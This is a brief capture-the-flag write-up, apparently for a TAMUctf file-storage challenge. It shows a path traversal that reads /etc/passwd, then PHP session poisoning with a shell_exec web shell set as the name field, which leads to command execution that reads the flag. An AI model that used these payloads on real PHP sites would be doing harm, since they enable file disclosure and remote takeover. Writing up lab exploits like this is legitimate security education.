## LFI

- `http://filestorage.tamuctf.com/index.php?file=../../../../../etc/passwd`

```
root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin
```

## php session poisoning

- From [https://github.com/w181496/Web-CTF-Cheatsheet#php-session](https://github.com/w181496/Web-CTF-Cheatsheet#php-session)
- Session exist at `sess_{PHPSESSID}`
- Check cookie and get `PHPSESSID`
- Find where session file exists
	- `http://filestorage.tamuctf.com/index.php?file=../../../../../tmp/sess_5lpmadkrnrft9a18hbbrshrond`
- Set name as `<?php echo shell_exec($_GET["command"]); ?>` and get RCE

## RCE

- Set GET parameter `command`
- `http://filestorage.tamuctf.com/index.php?file=../../../../../tmp/sess_5lpmadkrnrft9a18hbbrshrond&command=cat%20../../../../flag_is_here/flag.txt`

```
name|s:43:"gigem{535510n_f1l3_p0150n1n6}";
```


